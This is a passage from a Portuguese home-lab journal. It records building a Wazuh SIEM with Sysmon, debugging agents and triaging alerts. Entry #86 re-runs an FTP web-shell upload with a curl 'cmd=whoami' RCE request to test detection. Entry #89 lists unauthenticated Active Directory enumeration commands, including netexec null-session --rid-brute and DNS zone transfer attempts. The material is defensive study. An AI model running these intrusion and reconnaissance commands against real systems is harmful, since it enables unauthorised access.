- O assistente "Custom (advanced)" do VMware Workstation, ao contrário do menu de "VM Settings" de uma VM já criada, não oferece a opção "LAN segment" diretamente — só depois de criada é que essa opção aparece nas Network Adapter settings. Por isso a associação ao segmento "Ciber" teve sempre de ser feita à posteriori, tal como noutras VMs do lab.

**Consigo explicar isto a alguém?** Sim — sei explicar por que razão a VM ficou presa na configuração de rede (falta de servidor DHCP ativo) e por que o particionamento por defeito não usava o disco todo.

**Como nos podemos defender:** Não aplicável diretamente (é um exercício de infraestrutura, não uma técnica de ataque/defesa) — mas reforça a prática de sempre verificar o resumo de configuração antes de confirmar mudanças irreversíveis (particionamento de disco), e de documentar as dependências de rede entre VMs (o gateway tem de estar sempre ligado antes de qualquer outra VM do lab).

**Domínios relacionados:** A+ Core1 (virtualização, hardware, redes), Security+ (arquitetura de rede, gestão de sistemas)

**Próximos passos:** Configurar o IP fixo (192.168.10.30) via netplan; correr `apt update && apt upgrade`; iniciar a instalação manual do Wazuh (manager, indexer, dashboard); só depois, deploy dos agentes nas VMs alvo.

## Entrada #83 — VM Wazuh: hostname corrigido, IP fixo configurado e sistema atualizado

**Máquinas ligadas:** Kali (cliente SSH), OPNsense, VM Wazuh

**Objetivo:** Fechar a configuração base da VM Wazuh antes de iniciar a instalação do próprio Wazuh — corrigir o nome da máquina (que tinha ficado como `pedro`, herdado do utilizador, em vez de identificar a função da VM), atribuir o IP fixo previsto (192.168.10.30) e atualizar o sistema.

**Ação executada:**
1. Hostname do sistema corrigido de `pedro` para **`wazuh`**, via `sudo hostnamectl set-hostname wazuh` + correção manual da linha `127.0.1.1` em `/etc/hosts`.
2. Nome da VM no VMware Workstation (painel Library) também renomeado de "Ubuntu 64-bit" (genérico, deixado pelo assistente) para **"Wazuh"**, por clareza — feito com a VM ligada, sem impacto no sistema a correr.
3. IP fixo configurado via netplan (`/etc/netplan/50-cloud-init.yaml`): `192.168.10.30/24`, gateway e DNS `192.168.10.254` (OPNsense), substituindo a configuração DHCP usada durante a instalação. Ligação SSH caiu momentaneamente durante o `netplan apply` (esperado, mudança de IP a meio da sessão) — resolvido reconectando ao novo IP.
4. Conectividade confirmada de ponta a ponta: ping ao gateway (0% perda), ping a 8.8.8.8 (0% perda) e resolução DNS (`ping google.com` respondeu normalmente).
5. Sistema atualizado com `sudo apt update && sudo apt upgrade -y` (155 atualizações pendentes aplicadas).

**Resultado:** VM Wazuh totalmente integrada na rede do lab — hostname `wazuh`, IP `192.168.10.30` fixo, sistema atualizado, pronta para a instalação do Wazuh em si.

**Deduções e raciocínio:** Alterar o IP de uma máquina a meio de uma sessão SSH ativa derruba sempre essa ligação (a sessão TCP fica associada ao IP antigo) — é um comportamento esperado, não um erro, e resolve-se simplesmente reconectando ao novo endereço.

**Consigo explicar isto a alguém?** Sim.

**Como nos podemos defender:** Não aplicável (configuração de infraestrutura).

**Domínios relacionados:** A+ Core1/Core2 (redes, administração de sistemas Linux)

**Próximos passos:** Iniciar a instalação manual/nativa do Wazuh (manager, indexer, dashboard).

## Entrada #84 — Instalação manual completa do stack Wazuh (Indexer + Manager + Filebeat + Dashboard)

**Máquinas ligadas:** Kali (browser/SSH), OPNsense, VM Wazuh

**Objetivo:** Instalar manualmente (pacotes oficiais, sem Docker) os quatro componentes do Wazuh numa arquitetura "all-in-one" (todos na mesma VM, IP 192.168.10.30): Wazuh Indexer (motor de indexação, baseado em OpenSearch), Wazuh Manager (o SIEM/HIDS propriamente dito), Filebeat (transporte de alertas do Manager para o Indexer) e Wazuh Dashboard (interface web).

**Ação executada:**
1. **Certificados** — descarregada a ferramenta oficial `wazuh-certs-tool.sh` (v4.14) e um `config.yml` com os três nós (indexer `node-1`, server `wazuh-1`, dashboard `dashboard`), todos com o IP `192.168.10.30` (arquitetura de nó único). Certificados gerados com `wazuh-certs-tool.sh -A` e empacotados num `.tar`.
2. **Wazuh Indexer** — repositório oficial adicionado (chave GPG + `packages.wazuh.com/4.x/apt`), pacote `wazuh-indexer` (4.14.7-1) instalado. Certificados extraídos para `/etc/wazuh-indexer/certs/` (renomeados para `indexer.pem`/`indexer-key.pem`) com permissões restritas (500/400, dono `wazuh-indexer`). O `opensearch.yml` gerado por defeito já veio corretamente configurado (porque os nomes usados no `config.yml` coincidiam com os valores esperados pelo pacote). Serviço ativado e arrancado com sucesso; segurança inicializada com `/usr/share/wazuh-indexer/bin/indexer-security-init.sh` (cluster ficou em estado GREEN); testado com `curl -k -u admin:admin https://192.168.10.30:9200`, resposta confirmada.
3. **Wazuh Manager** — pacote `wazuh-manager` (4.14.7-1) instalado e arrancado sem qualquer configuração adicional necessária (todos os daemons: analysisd, remoted, syscheckd, modulesd, etc., iniciaram corretamente).
4. **Filebeat** — pacote `filebeat` (7.10.2-2) instalado, configurado com o template oficial (`filebeat.yml`) e o módulo Wazuh (`wazuh-filebeat-0.4`). Certificados próprios extraídos e renomeados (`filebeat.pem`/`filebeat-key.pem`). Credenciais do Indexer guardadas de forma segura no keystore do Filebeat (`filebeat keystore add username/password`).
5. **Wazuh Dashboard** — pacote `wazuh-dashboard` (4.14.7-1) instalado, certificados próprios extraídos, serviço arrancado e acesso confirmado via browser em `https://192.168.10.30`, login com sucesso (`admin`/`admin`), API "default" ligada automaticamente, painel "Overview" já a mostrar alertas reais (136 severidade média, 281 baixa nas últimas 24h) — confirmação de que a cadeia Manager → Filebeat → Indexer → Dashboard está totalmente integrada e a funcionar.

**Resultado:** Stack Wazuh 4.14.7 totalmente operacional (Indexer, Manager, Filebeat, Dashboard), acessível via `https://192.168.10.30`. Ainda sem agentes registados nas outras VMs do lab — o Manager está, por agora, só a monitorizar-se a si mesmo.

**Deduções e raciocínio:**
- **Padrão recorrente encontrado duas vezes:** tanto no `filebeat.yml` (`hosts: 127.0.0.1:9200`) como no `opensearch_dashboards.yml` (`opensearch.hosts: https://localhost:9200`), os ficheiros de configuração gerados por defeito apontavam para `localhost`/`127.0.0.1`, mas os certificados TLS foram gerados especificamente para o IP `192.168.10.30` (o valor usado no `config.yml`). Isto causa sempre um erro de verificação TLS (`certificate is valid for 192.168.10.30, not 127.0.0.1`) até se corrigir manualmente o endereço em cada ficheiro de configuração — mesmo numa instalação "all-in-one" onde tecnicamente os componentes comunicam consigo mesmos.
- Lição de permissões reforçada (já vista com os certificados do Indexer, Entrada #83): sempre que uma pasta é trancada com `chmod -R 500` para um utilizador de serviço específico, a expansão de wildcards (`*`) num comando seguinte tem de correr dentro do mesmo `sudo`/utilizador, senão falha silenciosamente com "No such file or directory".
- A arquitetura "all-in-one" só faz sentido para laboratório/estudo — em produção os três componentes correm normalmente em máquinas separadas, e os certificados de cada nó teriam IPs diferentes, o que tornaria estas correções de `localhost` desnecessárias.

**Consigo explicar isto a alguém?** Sim.

**Como nos podemos defender:** Não aplicável diretamente — é a construção da própria ferramenta de defesa (o SIEM). O cuidado com a validação estrita de certificados (em vez de desativar a verificação TLS) é em si uma boa prática de segurança que vale a pena destacar: preferimos corrigir a configuração a desligar a verificação.

**Domínios relacionados:** Security+ (SIEM, deteção e resposta, arquitetura de segurança), A+ Core2 (administração de sistemas Linux, serviços systemd)

**Próximos passos:** Registar agentes Wazuh nas restantes VMs do lab (Servidor Vulnerável, Windows Server, Windows 11, Ubuntu Desktop — Kali fica de fora, mantém o papel de atacante); gerar tráfego/ataques de teste e confirmar deteção no Dashboard.

---

## Entrada #85 — Registo do agente Wazuh no Ubuntu Desktop: instalação antiga descoberta, bug do `MANAGER_IP` e correção em três camadas

**Máquinas ligadas:** Ubuntu Desktop (agente), VM Wazuh (manager, 192.168.10.30)

**Objetivo:** Continuar os "Próximos passos" da Entrada #84 — registar os agentes Wazuh nas VMs do lab. O Servidor Vulnerável (agente `001`) registou-se sem incidentes. O Ubuntu Desktop, não — instalado o pacote com `sudo WAZUH_MANAGER='192.168.10.30' WAZUH_AGENT_NAME='ubuntu-wg' dpkg -i ./wazuh-agent_4.14.7-1_amd64.deb`, o serviço arrancava mas o agente nunca aparecia no dashboard.

**Ação executada — investigação em camadas, sem corrigir nada até perceber a causa completa:**
1. `grep` ao `ossec.conf` ativo revelou `<address>192.168.1.229</address>` — um endereço completamente fora da rede do lab (`192.168.10.0/24`).
2. `stat` ao ficheiro mostrou uma inconsistência reveladora: **Nascimento** (inode) de hoje, mas **Modificado** (conteúdo) de 18 de fevereiro de 2026 — assinatura clássica de um ficheiro copiado/preservado de outro lado, não escrito de novo.
3. `dpkg -l` confirmou o pacote instalado (`4.14.7-1`); o `history` revelou que o próprio `dpkg -i` tinha gerado um `ossec.conf.new` ao lado — comportamento padrão do dpkg quando encontra um conffile já existente no disco e não o substitui às cegas.
4. `client.keys` continha uma chave de enrollment **completa e válida**: `001 pedroferreira-VirtualBox` — o hostname antigo desta VM. Prova de que esta máquina já teve, antes de entrar para o lab, um Wazuh/OSSEC totalmente funcional e enrolled junto de outro manager (possivelmente ligado a notificações antigas recebidas no telemóvel — hipótese plausível mas não confirmável a partir daqui).
5. O `ossec.log` mostrava tentativas repetidas e falhadas de ligação a `192.168.1.229:1514` (erro 1216) e de enrollment em `192.168.1.229:1515` (erro 1208).
6. `grep` ao `ossec.conf.new` revelou um **segundo problema, independente do primeiro**: o campo `<address>` continha literalmente o texto `MANAGER_IP`, por substituir — confirmado por pesquisa como um bug conhecido do pacote `wazuh-agent` (variável de ambiente `WAZUH_MANAGER` não aplicada corretamente durante o `dpkg -i`, GitHub Issue #31389/#29501).
7. `nc -zv` às portas 1514 e 1515 do manager confirmou que a rede e o firewall do OPNsense não eram o problema — ligação limpa nos dois casos.
8. Só depois de isolar os três problemas reais (endereço errado no ficheiro ativo; chave de enrollment de outro manager; bug do placeholder no ficheiro novo) é que se avançou para a correção: `sed` para substituir `MANAGER_IP` pelo IP correto no `ossec.conf.new`; backup dos ficheiros antigos (`ossec.conf.old-192.168.1.229-fev2026`, `client.keys.old-pedroferreira-VirtualBox`); ficheiro corrigido colocado no lugar do ativo com dono/permissões corretos (`root:wazuh`, `660`); `client.keys` esvaziado para forçar um enrollment novo; serviço reiniciado.

**Resultado:** Log confirmou ligação bem-sucedida a `192.168.10.30:1514` e receção de configuração partilhada do manager (sinal de reconhecimento). `client.keys` passou a ter uma chave nova: `002 ubuntu-wg`. Dashboard confirma os dois agentes ativos: `001 servidor-vulneravel` e `002 ubuntu-wg`.

**Deduções e raciocínio:**
- Lição central sobre gestão de pacotes: reinstalar um pacote **não** é o mesmo que repor a configuração de fábrica — o `dpkg` preserva conffiles já existentes por desenho (proteção contra apagar personalizações do utilizador), e isso pode esconder resquícios de instalações completamente alheias ao contexto atual.
- Os timestamps de um ficheiro (nascimento do inode vs. data de modificação do conteúdo) são uma técnica de diagnóstico forense válida por si só: uma discrepância entre os dois denuncia que o conteúdo veio de outro lado, mesmo quando o ficheiro "parece" ter acabado de ser criado.
- Havia três problemas independentes sobrepostos. Corrigir só o mais óbvio (o endereço) teria deixado o agente partido de outra forma (bug do `MANAGER_IP`) ou incapaz de autenticar (chave antiga). A investigação em camadas, antes de qualquer correção, foi o que permitiu resolver tudo de uma vez em vez de ir descobrindo problemas novos a cada tentativa.
- Paralelo com o mundo real: reaproveitar uma máquina "já feita" sem auditar o que já lá está instalado é uma fonte comum de agentes/serviços esquecidos a comunicar para fora — neste caso inofensivo, mas é exatamente a mesma categoria de risco que aparece em gestão de ativos em ambientes reais.

**Consigo explicar isto a alguém?** Sim.

**Como nos podemos defender:** É construção da própria ferramenta de defesa (SIEM), mas a lição aplica-se diretamente a gestão de ativos e de configuração: antes de confiar numa máquina "reaproveitada" como limpa, auditar o que já lá está instalado (pacotes, serviços ativos, conffiles residuais) — e nunca assumir que reinstalar um pacote reset a configuração ao ponto de partida.

**Domínios relacionados:** Security+ (gestão de ativos e de configuração, SIEM/HIDS), A+ Core2 (gestão de pacotes Linux/dpkg, systemd, permissões de ficheiros)

**Próximos passos:** Gerar tráfego/ataques de teste nas VMs monitorizadas e confirmar deteção no dashboard (retomando o que ficou pendente da Entrada #84); registar os agentes restantes (Windows Server, Windows 11) se ainda não estiverem no Wazuh.

---

## Entrada #86 — Teste de deteção real: o Wazuh via o FTP, mas não via o ataque

**Máquinas ligadas:** Kali (atacante), Servidor Vulnerável (agente `001`), VM Wazuh (manager)

**Objetivo:** Fechar o último passo pendente da Fase 5 — repetir um ataque já conhecido (RCE via FTP anónimo + web shell, Entradas #59-60) com o Wazuh a vigiar, e confirmar no dashboard o que é realmente detetado por defeito.

**Ação executada:**
1. A partir do Kali, repetida a cadeia de ataque original: upload anónimo de `shell3.php` via FTP para `/srv/ftp/upload/`, seguido de `curl "http://192.168.10.101:8080/shell3.php?cmd=whoami"` — RCE confirmado (`www-data`), tal como na Entrada #60.
2. No dashboard (Threat Hunting, filtrado ao agente `servidor-vulneravel`), apareceram apenas **2 alertas**: `11401` ("vsftpd: FTP session opened") e `11402` ("vsftpd: FTP Authentication success"), ambos nível 3. **Nada** sobre o ficheiro escrito, **nada** sobre o comando executado.
3. Diagnóstico: o `<syscheck>` por defeito só vigia pastas de sistema (`/etc`, `/bin`, `/boot`, `/sbin`, `/usr/bin`, `/usr/sbin`) — `/srv/ftp/upload` fica de fora. A execução de comandos via `shell_exec` também não é vigiada por defeito (exigiria `auditd`, não configurado).
4. Correção aplicada: adicionada `<directories realtime="yes">/srv/ftp/upload</directories>` ao `ossec.conf` do Servidor Vulnerável, serviço reiniciado, confirmado no log que a pasta passou a ser monitorizada em tempo real.
5. Repetido o upload (`shell4.php`) — desta vez apareceu um terceiro alerta: `554` ("File added to the system"), nível 5, exatamente no momento do upload.

**Resultado:** Confirmado que a cobertura "de fábrica" do Wazuh vê autenticação e sessões de sistema, mas ignora pastas de aplicação e execução de processos até serem explicitamente configuradas. Depois do ajuste ao FIM, a escrita do ficheiro malicioso passa a gerar alerta; a execução do comando em si continua sem deteção (ficaria para uma iteração futura, com `auditd`).

**Deduções e raciocínio:** Esta é uma lição central de SIEM/Blue Team: instalar a ferramenta não é o mesmo que ter cobertura real — é preciso mapear o desenho de deteção à superfície de ataque real do sistema (onde vivem as aplicações, não só onde vive o sistema operativo). Um SIEM mal afinado dá uma falsa sensação de segurança precisamente nos pontos onde mais falta faz.

**Consigo explicar isto a alguém?** Sim.

**Como nos podemos defender:** Afinar o FIM para cobrir diretórios de aplicação/dados sensíveis, não só pastas de sistema; considerar `auditd` + regras Wazuh para vigiar execução de processos; tratar a implementação de um SIEM como um processo iterativo — testar contra ataques reais conhecidos, não assumir cobertura.

**Domínios relacionados:** Security+ D4 (Operações de Segurança — SIEM, deteção, resposta), NIS2/ISO 27001 (A.8.16 — deteção de atividade anómala)

**Próximos passos:** Fase 5 tecnicamente fechada. Falta a revisão de pré-publicação do projeto (subagente anterior interrompido, nunca concluída).

---

## Entrada #87 — Sessão 6.0 (retomada): agentes reativados, Sysmon no Windows Server, e dois relógios errados que quase esconderam tudo

**Máquinas ligadas:** Windows Server (agente `003`, Controlador de Domínio), Windows 11 (agente `004`), VM Wazuh (manager, agente `000`), OPNsense (firewall)

**Objetivo:** Fechar a Sessão 6.0 (preparação para os ataques ao Active Directory da Fase 6): confirmar os agentes Wazuh ativos em ambas as máquinas Windows, instalar o Sysmon no Windows Server, e confirmar deteção real no Dashboard.

**Alternativas consideradas:**
- Configuração do Sysmon: escolhida a do SwiftOnSecurity (referência mais usada por quem está a começar em deteção, bem comentada, boa relação cobertura/ruído) em vez de configurações mais avançadas e modulares (ex: Olaf Hartong), que exigiriam já mais experiência para afinar.
- Descarregado só o `Sysmon64.exe` via `live.sysinternals.com`, não o Sysinternals Suite completo — só precisávamos desta ferramenta, e o link direto garante sempre a versão mais recente.
- Fuso horário do Windows Server: corrigido para "GMT Standard Time" (o ID da Microsoft que agrupa Reino Unido, Irlanda e Portugal, com hora de verão), por ser o fuso correto para Portugal, em vez de tentar um ajuste manual do relógio sem corrigir a causa raiz.

**Ação executada:**
1. Confirmado agente Wazuh do Windows 11 já `Active` (pendência da entrada anterior resolvida sozinha). Windows Server aparecia `Disconnected` apesar de já registado — resolvido com `Restart-Service WazuhSvc`.
2. Descoberto e corrigido um bug lateral: o Windows 11 suspendia-se automaticamente ao fim de 15 minutos de inatividade (`powercfg`), provável causa das oscilações do agente. Corrigido com `powercfg /change standby-timeout-ac 0` e `-dc 0`.
3. Aberta uma exceção de *egress filtering* no OPNsense (TCP 443, saída) para o Windows Server e o Windows 11, para permitir o Windows Update — a instalação do módulo `PSWindowsUpdate` ficou presa em "Connecting to Microsoft Update server...", sem listar atualizações nem erro. Suspeita: falta também porta 80 para validação de certificados (CRL/OCSP). **Pendência não resolvida**, não bloqueia a Fase 6.
4. Instalado o Sysmon no Windows Server (`Sysmon64.exe -accepteula -i sysmonconfig-export.xml`), com a configuração do SwiftOnSecurity. Serviço confirmado `Running`.
5. Editado o `ossec.conf` do agente Windows Server para incluir `<localfile><location>Microsoft-Windows-Sysmon/Operational</location><log_format>eventchannel</log_format></localfile>` — apanhado e corrigido um bloco duplicado (`active-response\active-responses.log` colado duas vezes por engano) antes de reiniciar o serviço.
6. **Descoberta principal:** ao tentar confirmar no Dashboard um evento de teste (`calc.exe`), o evento não aparecia. A investigação revelou dois relógios errados: o Windows Server estava no fuso "Pacific Time (US & Canada)" (UTC-08:00) desde a instalação — quase 8 horas de diferença da hora real; a VM do Wazuh estava corretamente sincronizada por NTP, mas a exibir em UTC em vez da hora local de Lisboa (1 hora de diferença aparente). Corrigidos os dois: `Set-TimeZone -Id "GMT Standard Time"` no Windows Server, `timedatectl set-timezone Europe/Lisbon` na VM do Wazuh.
7. Mesmo com a hora corrigida, um novo teste (`calc.exe`, depois `whoami /all`) continuava sem aparecer no Dashboard. Confirmado via `grep log_alert_level` que o manager só regista alertas de nível ≥3 — processos benignos sem regra específica associada nunca cruzam esse limiar.
8. Testada a hipótese baixando temporariamente `log_alert_level` para `0` e reiniciando o manager: mesmo assim, nenhum alerta novo apareceu para o `whoami`. Conclusão mais precisa: o limiar não era a causa — não existe nenhuma regra genérica de "processo criado" no ruleset instalado, só regras para padrões específicos (PowerShell suspeito, atividade de descoberta, etc.). Baixar o limiar não cria correspondências novas, só revela alertas que já existiam a níveis mais baixos — e não existiam nenhuns.
9. Confirmação definitiva feita fora do Wazuh: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"` no próprio Windows Server mostrou o evento completo do `whoami /all` (hash, processo-pai `powershell.exe`, linha de comandos, utilizador), provando que o Sysmon captura tudo corretamente — a "ausência" no Dashboard é comportamento de alerta, não falha de captura.
10. Revertido `log_alert_level` para `3`, manager reiniciado, confirmado `active (running)` sem erros.

**Resultado:** Sessão 6.0 tecnicamente fechada para o Windows Server: agente ativo, Sysmon instalado com a configuração do SwiftOnSecurity, pipeline Sysmon → agente → manager → regra → alerta confirmado de ponta a ponta (via alertas reais de PowerShell/SecEdit gerados durante a própria sessão). Falta repetir a instalação do Sysmon no Windows 11.

**Deduções e raciocínio:** Duas lições distintas, ambas centrais para SIEM/Blue Team. Primeira: a hora certa não é um detalhe cosmético — é a base de tudo o resto num SIEM (correlação, janelas de deteção, linhas temporais de investigação); um relógio errado pode fazer parecer que "nada está a ser detetado" quando na verdade está tudo a acontecer, só que fora da janela de tempo onde se está a olhar. Segunda, e mais subtil: existe uma diferença real entre "o Sysmon captou o evento" e "o Wazuh gerou um alerta" — um SIEM bem afinado não alerta por tudo, só por padrões reconhecidos como suspeitos; baixar um limiar de alerta não faz nascer regras novas, só ajusta o que já existia. Confundir estas duas coisas leva a diagnósticos errados ("não está a funcionar") quando na realidade está tudo a funcionar como desenhado.

**Consigo explicar isto a alguém?** Sim.

**Como nos podemos defender / lição operacional:** Sincronizar o relógio de todas as máquinas via NTP (idealmente com uma fonte de tempo interna e fiável, não deixado ao acaso da instalação) deve ser um dos primeiros passos ao montar qualquer infraestrutura de deteção — não um afterthought. Ao validar um SIEM, testar sempre com ações que se sabe que devem disparar uma regra específica (não ações genéricas e inofensivas), e, quando um evento "não aparece", verificar a fonte de dados diretamente (o próprio log do Sysmon) antes de assumir que o pipeline está avariado.

**Domínios relacionados:** Security+ D4 (Operações de Segurança — SIEM, alerta e monitorização, sincronização de tempo), ISO/IEC 27001:2022 Anexo A.8.17 (Sincronização do relógio), NIS2 (integridade de registos/logs para resposta a incidentes)

**Próximos passos:** Instalar o Sysmon no Windows 11 (repetir o mesmo processo). Fechar oficialmente a Sessão 6.0 e avançar para a 6.1 (enumeração do Active Directory). Revisitar, sem pressa, a pendência do Windows Update (porta 80 / CRL-OCSP).

**English summary:** Reactivated the Wazuh agents on both Windows machines and installed Sysmon (SwiftOnSecurity config) on the Windows Server domain controller. Found and fixed two separate clock problems — an 8-hour timezone offset on the Windows Server, and the Wazuh VM displaying UTC instead of local time — that made real detections look like they weren't happening. Also clarified a key distinction: Sysmon capturing an event is not the same as Wazuh generating an alert — the manager only alerts on events matching a specific rule, regardless of the alert-level threshold.

---
## Entrada #88 — Sysmon no Windows 11: um "laboratório antigo", um falso positivo de nível 15, e a Sessão 6.0 fechada

**Máquinas ligadas:** Windows 11 (agente `004`), VM Wazuh (manager, agente `000`)

**Objetivo:** Repetir no Windows 11 o mesmo processo do Windows Server (Entrada #87): confirmar/instalar o Sysmon, ligar o Wazuh a essa fonte de eventos, e confirmar deteção real — fechando assim a Sessão 6.0 nas duas máquinas Windows.

**Alternativas consideradas:**
- Ao descobrir que o Sysmon já estava instalado (serviço `Sysmon64` já registado), em vez de desinstalar e reinstalar às cegas, optámos por primeiro comparar o hash SHA256 da configuração ativa (`C:\Sysmon\sysmonconfig.xml`) com a do ficheiro descarregado hoje — só decidindo o próximo passo depois de confirmar que eram exatamente o mesmo ficheiro.
- Para testar a deteção, reutilizado o comando `whoami /all` (já validado na Entrada #87) em vez de experimentar um comando novo — permite comparar diretamente os dois resultados e confirmar se o problema do relógio foi mesmo a única causa do atraso anterior.

**Ação executada:**
1. Descarregado `Sysmon64.exe` e `sysmonconfig-export.xml` (SwiftOnSecurity) para `C:\Windows\Temp` no Windows 11, replicando o Windows Server.
2. Confirmado o fuso horário do Windows 11 antes de instalar (`Get-TimeZone`, `Get-Date`) — já correto ("GMT Standard Time", hora real de Lisboa), ao contrário do Windows Server na entrada anterior.
3. Tentativa de instalação recusada: "The service Sysmon64 is already registered." — descoberta de uma instalação pré-existente, de um laboratório anterior do Pedro (não deste projeto documentado).
4. Comparados os hashes SHA256 da configuração ativa (`C:\Sysmon\sysmonconfig.xml`) e da descarregada hoje (`C:\Windows\Temp\sysmonconfig-export.xml`) — idênticos, confirmando que já era a configuração do SwiftOnSecurity.
5. Confirmado, com `Select-String -Pattern "Sysmon"` no `ossec.conf`, que o Wazuh **não** estava ligado a esta fonte — faltava só a integração, não a instalação.
6. Editado o `ossec.conf` do Windows 11 (ficheiro completo dado para colar, para evitar o erro de duplicação da Entrada #87), com o mesmo bloco `<localfile>` para `Microsoft-Windows-Sysmon/Operational`. Serviço `WazuhSvc` reiniciado sem erros.
7. Confirmado no manager (`agent_control -l`) o agente `windows11` (004) como `Active`.
8. Testada a deteção com `whoami /all` — desta vez o evento apareceu no Dashboard em segundos (209 hits em poucos minutos), sem o atraso de horas da Entrada #87, confirmando que o relógio errado foi mesmo a causa raiz daquele atraso.
9. Encontrado, entre os hits, um alerta de **nível 15** — "Executable file dropped in folder commonly used by malware" (regra 92213, MITRE T1105 — Ingress Tool Transfer). Investigado o evento: `powershell.exe` tinha criado `C:\Users\pedro\AppData\Local\Temp\__PSScriptPolicyTest_xfwhyhoi.czh.ps1` — um ficheiro temporário que o próprio PowerShell gera automaticamente ao arrancar, para testar a política de execução de scripts. Confirmado como falso positivo conhecido, não um incidente real.

**Resultado:** Sessão 6.0 fechada nas duas máquinas Windows. No Windows Server o Sysmon foi instalado de raiz (Entrada #87); no Windows 11 já existia (de um laboratório anterior) e só faltava a ligação ao Wazuh. Pipeline Sysmon → agente → manager → regra → alerta confirmado de ponta a ponta nas duas máquinas, incluindo um primeiro exercício real de triagem de um alerta de severidade alta.

**Deduções e raciocínio:** Duas lições. Primeira: nem tudo o que existe numa VM foi feito por nós — antes de instalar uma ferramenta, vale a pena verificar o que já lá está; comparar hashes evitou uma reinstalação desnecessária e um possível conflito de configuração. Segunda: nível de alerta alto não é sinónimo de incidente real — a regra que disparou generaliza um padrão (`.ps1` criado numa pasta Temp) que tanto é usado por malware como por comportamento legítimo do próprio Windows; o que decide é sempre a origem do evento (processo, utilizador, contexto), nunca o número do nível isolado.

**Consigo explicar isto a alguém?** Sim.

**Como nos podemos defender / lição operacional:** Antes de instalar ferramentas de deteção numa máquina, verificar sempre o que já lá está (serviços registados, ficheiros de configuração, hashes) — evita trabalho duplicado e configurações inconsistentes. E treinar sempre a triagem: um alerta de nível alto merece investigação da origem antes de qualquer reação, nunca uma resposta automática só pelo número do nível.

**Domínios relacionados:** Security+ D4 (Operações de Segurança — deteção, triagem de alertas, falsos positivos), MITRE ATT&CK (T1105 — Ingress Tool Transfer), ISO/IEC 27001:2022 Anexo A.8.16 (Atividades de monitorização)

**Próximos passos:** Sessão 6.0 oficialmente fechada. Avançar para a Sessão 6.1 (enumeração do Active Directory a partir do Kali).

**English summary:** Repeated the Sysmon setup on the Windows 11 client, discovering it was already installed from an earlier, unrelated lab — confirmed via SHA256 hash comparison before deciding not to reinstall. Linked it to Wazuh and confirmed detection worked within seconds now that the clock was correct. Triaged a level-15 alert (MITRE T1105) that turned out to be a known false positive: a temporary `.ps1` file PowerShell creates on startup — closing Session 6.0 on both Windows machines.

---

## Entrada #89 — Sessão 6.1: enumeração do Active Directory sem credenciais, vista de atacante externo

**Máquinas ligadas:** Kali Linux (Atacante, `192.168.10.10`), Windows Server (Controlador de Domínio, `192.168.10.1`), VM Wazuh (manager, `192.168.10.30`)

**Objetivo:** Iniciar a Sessão 6.1 da Fase 6 — perceber o que um atacante externo, sem qualquer credencial válida, consegue ver e enumerar do domínio `lab.local` a partir do Kali: scan de portas dirigido, scripts LDAP/SMB do nmap, tentativa de bind LDAP anónimo, e enumeração SMB sem credenciais com o netexec.

**Alternativas consideradas:**
- Combinar várias ferramentas pequenas e específicas (`nmap`, `ldapsearch`, `netexec`, `dig`) em vez de uma ferramenta all-in-one, para observar cada mecanismo isoladamente e perceber a diferença entre informação exposta por definição do protocolo (o RootDSE do LDAP) e uma eventual falha de configuração real.
- Usado o `netexec` (sucessor ativamente mantido) como ferramenta principal de fingerprinting/enumeração SMB, com o `crackmapexec` como alternativa de reserva caso não estivesse instalado.

**Ação executada:**
1. Scan de portas dirigido aos serviços típicos de um Controlador de Domínio (`nmap -sV -p 53,88,135,139,389,445,464,636,3268,3269 192.168.10.1`) — todas as portas abertas, confirmando o DC; hostname (`WIN-54OBK8B48L5`) e sistema operativo revelados via banner/Service Info, sem qualquer autenticação.
2. Scripts NSE dedicados de LDAP e SMB (`ldap-rootdse`, `smb-os-discovery`, `smb-enum-shares`, `smb-enum-users`). O `ldap-rootdse` devolveu um grande volume de informação do diretório (nível funcional do domínio/floresta, todos os *naming contexts*, site AD, `dnsHostName` completo) — informação pública por definição do protocolo LDAP, não uma falha. Os scripts de SMB não devolveram partilhas nem utilizadores.
3. Tentativa explícita de bind LDAP anónimo contra um *naming context* real (`ldapsearch -x -H ldap://192.168.10.1 -b "dc=lab,dc=local" -s sub "(objectClass=*)"`) — recusado com `Operations error... successful bind must be completed`, confirmando o bind anónimo desativado (ao contrário do RootDSE, sempre acessível).
4. Fingerprinting SMB com `netexec smb 192.168.10.1` — revelou Windows Server 2022 (Build 20348), assinatura SMB ativa, SMBv1 desativado, e um detalhe a investigar: `Null Auth: True` (a sessão SMB nula é aceite).
5. Testadas duas operações reais aproveitando essa sessão nula: `netexec smb 192.168.10.1 -u '' -p '' --shares` e `--rid-brute` — ambas recusadas com `STATUS_ACCESS_DENIED`. Confirma-se o padrão `RestrictAnonymous = 1`: a sessão é aceite, mas a listagem de partilhas e o RID cycling via LSA estão bloqueados.
6. Teste de transferência de zona DNS (`dig axfr lab.local @192.168.10.1`) — recusado (`; Transfer failed.`), confirmando que o servidor de DNS do domínio está corretamente restrito.

**Resultado:** Sessão 6.1 fechada com um retrato completo da superfície visível a um atacante externo sem credenciais. Exposto por definição de protocolo: nome do domínio, hostname do DC, nível funcional, versão do Windows Server, estado do SMB signing/SMBv1. Corretamente bloqueado: bind LDAP anónimo, listagem de partilhas SMB, RID cycling, transferência de zona DNS. Nenhuma vulnerabilidade explorável encontrada — um resultado honesto e realista, em contraste com a Fase 4 (onde quase tudo estava mal configurado por design).

**Deduções e raciocínio:** Duas lições centrais. Primeira: há uma diferença fundamental entre informação que um protocolo expõe por definição (o RootDSE do LDAP, sempre público, não é uma falha) e uma falha de configuração real — confundir as duas leva a um relatório de pentest impreciso. Segunda: "sessão aceite" não é o mesmo que "acesso concedido" — o `Null Auth: True` do netexec podia sugerir uma exposição, mas o servidor aceita a ligação e depois nega qualquer operação real (`RestrictAnonymous = 1`); só testar a operação em si (listar, ler) confirma se há exposição de facto.

**Consigo explicar isto a alguém?** Sim.

**Como nos podemos defender / lição operacional:** Mesmo sem nenhuma falha a corrigir aqui, esta sessão funciona como checklist de hardening de um DC exposto: bind LDAP anónimo desativado, `RestrictAnonymous` a pelo menos nível 1 (idealmente 2, se não houver dependência de sessões nulas), transferência de zona DNS restrita a servidores autorizados, e assinatura SMB ativa. Este Windows Server cumpre os quatro por defeito — mas nem sempre é o caso em ambientes reais mais antigos ou mal migrados.

